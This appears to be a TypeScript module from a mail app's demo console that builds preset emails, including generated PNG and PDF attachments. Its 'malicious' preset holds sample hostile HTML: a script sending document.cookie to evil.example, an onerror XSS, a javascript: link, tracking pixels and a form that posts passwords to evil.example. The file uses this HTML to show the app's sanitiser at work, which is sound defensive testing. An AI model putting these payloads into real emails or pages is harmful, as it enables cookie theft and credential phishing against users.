import { crc32, deflateSync } from 'node:zlib';
import type Mail from 'nodemailer/lib/mailer/index.js';

/**
 * Ready-made emails for the demo console's "Send an email into PhoneMail".
 * They go through the real SMTP server on port 2525, exactly like mail from
 * another provider would.
 */
export const DEMO_PRESETS = ['plain', 'long', 'attachment', 'malicious'] as const;
export type DemoPreset = (typeof DEMO_PRESETS)[number];

/** A small PNG (a green gradient "postcard"), made in code so the repo has no binary files. */
export function makePostcardPng(width = 240, height = 150): Buffer {
  const rows: Buffer[] = [];
  for (let y = 0; y < height; y++) {
    const row = Buffer.alloc(1 + width * 3); // first byte: PNG filter type 0
    for (let x = 0; x < width; x++) {
      const t = (x + y) / (width + height);
      row[1 + x * 3] = Math.round(0 + 37 * t); // R
      row[2 + x * 3] = Math.round(128 + 83 * t); // G
      row[3 + x * 3] = Math.round(105 - 3 * t); // B
    }
    rows.push(row);
  }
  const chunk = (type: string, data: Buffer) => {
    const length = Buffer.alloc(4);
    length.writeUInt32BE(data.length);
    const body = Buffer.concat([Buffer.from(type, 'ascii'), data]);
    const crc = Buffer.alloc(4);
    crc.writeUInt32BE(crc32(body));
    return Buffer.concat([length, body, crc]);
  };
  const header = Buffer.alloc(13);
  header.writeUInt32BE(width, 0);
  header.writeUInt32BE(height, 4);
  header[8] = 8; // bit depth
  header[9] = 2; // colour type: RGB
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    chunk('IHDR', header),
    chunk('IDAT', deflateSync(Buffer.concat(rows))),
    chunk('IEND', Buffer.alloc(0)),
  ]);
}

/** A one-page PDF "train ticket", with a correct cross-reference table. */
export function makeTicketPdf(): Buffer {
  const text = 'BT /F1 16 Tf 24 90 Td (Train ticket: Chennai Egmore to Tiruchirappalli) Tj ET';
  const objects = [
    '<< /Type /Catalog /Pages 2 0 R >>',
    '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
    '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 520 180] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>',
    `<< /Length ${text.length} >>\nstream\n${text}\nendstream`,
    '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>',
  ];
  let pdf = '%PDF-1.4\n';
  const offsets: number[] = [];
  objects.forEach((body, i) => {
    offsets.push(Buffer.byteLength(pdf));
    pdf += `${i + 1} 0 obj\n${body}\nendobj\n`;
  });
  const xrefAt = Buffer.byteLength(pdf);
  pdf += `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n`;
  pdf += offsets.map((o) => `${String(o).padStart(10, '0')} 00000 n \n`).join('');
  pdf += `trailer\n<< /Size ${objects.length + 1} /Root 1 0 R >>\nstartxref\n${xrefAt}\n%%EOF\n`;
  return Buffer.from(pdf);
}

const LONG_TEXT = [
  'Here is your weekly reading list, as promised.',
  'Email is older than the web. The first message between two computers went out in 1971, and the "@" sign was picked because it could not appear in anyone\'s name. Fifty years later, the same basic idea still carries most of the world\'s important messages: receipts, tickets, contracts, school notices and letters from people we love.',
  'What changed is how we read it. On phones, most people spend their day in chat apps: short messages, one thread per person, instant replies. Long subject lines and folders feel slow in comparison. PhoneMail tries to meet people where they already are: your phone number is your address, and your inbox looks like your chats.',
  'Three tips for this week. First, swipe right on any email to reply to it; each email can be answered once, which keeps conversations tidy. Second, tap an email to read it in full, with its original formatting. Third, add an alias in Settings if you want a name-based address for newsletters.',
  'If you are reading this in the chat view, you will notice it is clamped after a few lines. That is on purpose: long emails do not flood the chat. Tap "Read more" to open it in the traditional reader, where there is space for everything.',
  'Next week: how PhoneMail keeps harmful email content out of your screen, and why remote images stay blocked until you tap "Show images".',
  'Happy reading!',
].join('\n\n');

const MALICIOUS_HTML = `
<p>Dear customer,</p>
<p>Your <b>account statement</b> is ready. <a href="javascript:alert('your cookies')">View statement</a></p>
<script>fetch('https://evil.example/steal?c=' + document.cookie)</script>
<img src="missing.png" onerror="alert('hacked')">
<img src="https://tracker.example/open.gif?user=you" width="1" height="1" alt="">
<iframe src="https://evil.example/login"></iframe>
<form action="https://evil.example/collect" method="post">
  <p>Confirm your password: <input type="password" name="password"> <button>Confirm</button></p>
</form>
<div style="background:url(https://tracker.example/bg.png)">Styled with a tracking background</div>
<p style="color:#008069">This green line is harmless formatting and stays.</p>
`;

export function presetEmail(preset: DemoPreset): Mail.Options {
  switch (preset) {
    case 'plain':
      return {
        from: { name: 'Riya from Gmail', address: 'riya.friend@example.com' },
        subject: 'Hello from outside PhoneMail',
        text: "Hi! I sent this from an ordinary email address, over SMTP, the way Gmail's servers would. It landed straight in your PhoneMail chats.",
      };
    case 'long':
      return {
        from: { name: 'Weekly Reads', address: 'digest@example.com' },
        subject: 'Your weekly reading list',
        text: LONG_TEXT,
      };
    case 'attachment':
      return {
        from: { name: 'Travel Desk', address: 'travel@example.com' },
        subject: 'Trip photos and your ticket',
        text: 'Attached: a postcard from the trip and your train ticket (PDF).',
        attachments: [
          { filename: 'postcard.png', content: makePostcardPng(), contentType: 'image/png' },
          { filename: 'ticket.pdf', content: makeTicketPdf(), contentType: 'application/pdf' },
        ],
      };
    case 'malicious':
      return {
        from: { name: 'Account Team', address: 'statements@example.net' },
        subject: 'Your account statement',
        text: 'Your account statement is ready. (This email also contains harmful HTML that PhoneMail removes.)',
        html: MALICIOUS_HTML,
      };
  }
}
